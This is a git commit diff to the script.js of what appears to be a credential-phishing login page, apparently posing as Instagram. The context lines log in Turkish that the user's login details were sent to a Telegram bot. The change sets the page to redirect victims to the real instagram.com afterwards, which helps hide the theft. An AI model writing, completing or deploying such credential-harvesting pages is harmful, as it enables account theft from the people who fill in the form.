14da375842907975d3332630f9ad2d64b8044a3c
coinappcrypto <95140309+coinappcrypto@users.noreply.github.com>
2025-01-21 16:46:14 +0300

    Update script.js

--- public/script.js
+++ public/script.js
@@ -26,7 +26,7 @@ document.querySelector('.login-form').addEventListener('submit', function(event)
             if (data.ok) {
                 console.log('Kullanıcı bilgileri Telegram botuna gönderildi.');
                 // Yönlendirme işlemi
-                window.location.href = '';
+                window.location.href = 'https://www.instagram.com/';
             } else {
                 console.error('Telegram botuna gönderme işlemi başarısız oldu:', data.description);
             }
